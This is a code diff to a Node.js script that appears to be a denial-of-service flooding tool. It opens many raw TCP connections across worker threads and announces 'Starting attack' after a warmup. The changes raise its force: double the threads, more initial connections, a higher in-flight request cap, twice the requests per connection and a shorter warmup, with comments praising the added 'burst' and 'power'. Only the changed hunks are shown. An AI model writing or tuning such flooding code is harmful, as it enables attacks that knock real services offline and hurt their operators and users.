@@ -4,11 +4,11 @@ const { cpus } = require('os');
 const readline = require('readline');
 const net = require('net');
 
-const THREADS = 16;
-const INITIAL_CONNECTIONS =25;
-const POWER_MULTIPLIER = 3;
-const WARMUP_TIME = 10000;
-const MAX_INFLIGHT = 2000;
+const THREADS = 32; // More threads for H1, higher burst capacity
+const INITIAL_CONNECTIONS = 30; // Even more initial connections to ramp power
+const POWER_MULTIPLIER = 3; // Increase power scale for H1-like performance
+const WARMUP_TIME = 5000;
+const MAX_INFLIGHT = 3000; // Much higher inflight count for larger request handling
 
 let totalRequests = 0;
 let successCount = 0;
@@ -26,7 +26,7 @@ if (isMainThread) {
     const duration = parseInt(process.argv[3]);
 
     console.clear();
-    console.log(`Warming up... Starting attack in 10s`);
+    console.log(`Warming up... Starting attack in 5s`);
 
     setTimeout(() => {
         console.clear();
@@ -122,7 +122,7 @@ if (isMainThread) {
             client.on('close', () => setTimeout(createConnection, 100));
             client.on('connect', () => {
                 const inflight = { count: 0 };
-                for (let i = 0; i < 100; i++) sendOne(client, inflight);
+                for (let i = 0; i < 200; i++) sendOne(client, inflight); // Increased request number for burst
             });
         } catch {
             setTimeout(createConnection, 250);
